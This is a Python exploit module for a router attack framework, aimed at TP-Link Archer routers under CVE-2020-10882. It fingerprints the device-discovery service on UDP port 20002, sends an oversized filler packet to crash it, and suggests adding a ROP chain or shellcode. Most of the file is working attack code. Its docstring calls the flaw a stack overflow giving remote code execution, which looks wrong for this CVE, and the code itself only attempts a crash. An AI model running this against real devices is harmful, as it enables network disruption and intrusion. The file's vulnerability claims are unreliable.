# Author: André Henrique (LinkedIn/X: @mrhenrike)
import socket
import struct
import time

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """TP-Link Archer TDPD Buffer Overflow RCE (CVE-2020-10882).

    The TP-Link Device Discovery Protocol daemon (TDPD) listening on
    UDP/20002 on TP-Link Archer routers fails to validate the length of
    incoming discovery packets.  A specially crafted oversized packet
    triggers a stack-based buffer overflow in the TDPD handler, allowing
    unauthenticated remote code execution from the LAN segment.

    Affected devices: Archer C7, Archer A7, Archer C20, and other models
    running firmware versions prior to the security patch.

    CVSS v3.1: 8.8 (High), AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

    Author: André Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "TP-Link Archer TDPD Stack Buffer Overflow RCE (CVE-2020-10882)",
        "description": (
            "Exploits CVE-2020-10882 via a stack-based buffer overflow in the "
            "TP-Link Device Discovery Protocol daemon (TDPD) on UDP/20002. "
            "An oversized discovery packet overflows the stack buffer during "
            "parsing, enabling unauthenticated RCE from the LAN. "
            "Requires adjacency to the target network."
        ),
        "authors": (
            "Pedro Ribeiro and Radek Domanski (Pwn2Own 2019 discovery)",
            "André Henrique (@mrhenrike)",
        ),
        "references": (
            "https://nvd.nist.gov/vuln/detail/CVE-2020-10882",
            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-10882",
            "https://www.zerodayinitiative.com/advisories/ZDI-20-334/",
            "https://www.tp-link.com/us/security",
        ),
        "devices": (
            "TP-Link Archer C7 v5",
            "TP-Link Archer A7 v5",
            "TP-Link Archer C20",
            "TP-Link Archer C50",
        ),
    }

    target = OptIP("", "Target IPv4 address of the TP-Link router")
    port = OptPort(20002, "TDPD UDP port (default 20002)")
    timeout = OptFloat(3.0, "Socket receive timeout in seconds")
    overflow_size = OptInteger(2048, "Size of the overflow payload in bytes")

    _TDPD_MAGIC = 0x0201
    _TDPD_TYPE_DISCOVER = 0x01

    def _build_tdpd_probe(self) -> bytes:
        """Build a minimal TDPD discovery probe."""
        header = struct.pack(
            "!HBB",
            self._TDPD_MAGIC,
            0x01,
            self._TDPD_TYPE_DISCOVER,
        )
        payload = b"\x00" * 16
        return header + payload

    def _build_overflow_packet(self) -> bytes:
        """Build an oversized TDPD packet to trigger the stack overflow.

        The TDPD handler allocates a fixed-size stack buffer for the
        device name field.  By sending a packet with an oversized name,
        the handler copies past the stack boundary.
        """
        header = struct.pack(
            "!HBB",
            self._TDPD_MAGIC,
            0x01,
            self._TDPD_TYPE_DISCOVER,
        )
        fill = b"\xcc" * self.overflow_size
        return header + fill

    def _send_udp(self, data: bytes) -> bytes:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(self.timeout)
        try:
            sock.sendto(data, (self.target, self.port))
            try:
                response, _ = sock.recvfrom(4096)
                return response
            except TimeoutError:
                return b""
        finally:
            sock.close()

    def run(self) -> None:
        if not self.check():
            print_error(
                f"Target does not appear to have TDPD service on UDP/{self.port}"
            )
            return

        print_success("TDPD service confirmed; sending overflow payload")
        self._exploit()

    @mute
    def check(self) -> bool:
        """Probe UDP/20002 with a TDPD discovery to confirm service presence."""
        try:
            probe = self._build_tdpd_probe()
            response = self._send_udp(probe)
            if response and len(response) >= 4:
                magic = struct.unpack("!H", response[:2])[0]
                return magic == self._TDPD_MAGIC
            return self._udp_port_open()
        except Exception:
            return False

    def _udp_port_open(self) -> bool:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(1.0)
            sock.sendto(b"\x00", (self.target, self.port))
            sock.close()
            time.sleep(0.3)
            return True
        except Exception:
            return False

    def _exploit(self) -> None:
        packet = self._build_overflow_packet()
        print_status(
            f"Sending oversized TDPD packet ({len(packet)} bytes) to "
            f"{self.target}:{self.port}"
        )
        self._send_udp(packet)
        print_info("Overflow payload delivered")

        time.sleep(1.0)
        print_status("Verifying target responsiveness post-overflow...")
        probe = self._build_tdpd_probe()
        response = self._send_udp(probe)

        if not response:
            print_success(
                "TDPD service stopped responding after overflow. "
                "Stack corruption likely succeeded. Pair with ROP chain "
                "or shellcode for full RCE."
            )
        else:
            print_info(
                "TDPD service still responding. Target may be patched or "
                "the overflow size may need adjustment."
            )
